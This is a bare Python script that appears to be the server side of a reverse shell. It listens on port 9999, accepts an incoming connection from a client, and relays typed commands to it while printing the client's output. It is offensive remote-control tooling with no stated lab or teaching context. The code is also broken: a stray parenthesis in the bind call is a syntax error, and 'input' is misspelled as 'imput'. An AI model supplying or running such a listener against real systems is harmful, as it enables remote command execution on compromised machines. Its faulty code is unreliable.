import socket
import sys

# create socket
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# bind socket to port and wait for connection
def socket_bind():
    try:
        global host
        global port
        global s
        print("[+] Binding socket to port: " + str(port))
        s.bind((host,port)))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()

# establish connection
def socket_accept():
    conn, address = s.accept()
    print("[+] Connection established | " + address[0] + ":" + str(address[1]))
    send_commands(conn)
    conn.close()

# send commands
def send_commands(conn):
    while True:
        cmd = imput()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

# main
def main():
    socket_create()
    socket_bind()
    socket_accept()


if __name__ == '__main__':
    main()